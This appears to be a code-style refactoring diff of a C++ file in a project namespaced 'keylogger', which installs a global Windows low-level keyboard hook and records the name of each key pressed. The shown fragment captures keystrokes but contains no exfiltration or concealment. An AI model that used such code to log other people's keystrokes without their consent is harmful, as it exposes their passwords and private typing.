@@ -1,23 +1,22 @@
 #include "KeyboardProcessor.h"
 
-#include "Windows.h"
 #include "KeyBinding.h"
 
 namespace keylogger
 {
 
-HHOOK KeyboardProcessor::hook = NULL;
+HHOOK KeyboardProcessor::hook = nullptr;
 
 void KeyboardProcessor::hookKeyboardProcessing()
 {
     hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProcessor::processKeyboard,
-                             GetModuleHandle(NULL), 0);
+                            GetModuleHandle(nullptr), 0);
 }
 
 void KeyboardProcessor::unhookKeyboardProcessing()
 {
     UnhookWindowsHookEx(hook);
-    hook = NULL;
+    hook = nullptr;
 }
 
 LRESULT KeyboardProcessor::processKeyboard(int nCode, WPARAM wparam, LPARAM lparam)
@@ -27,7 +26,7 @@ LRESULT KeyboardProcessor::processKeyboard(int nCode, WPARAM wparam, LPARAM lpar
         CallNextHookEx(hook, nCode, wparam, lparam);
     }
 
-    KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
+    auto* kbs = (KBDLLHOOKSTRUCT*)lparam;
     if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
     {
         KeyboardInput::appendToInput(Keys::keys[kbs->vkCode].name);
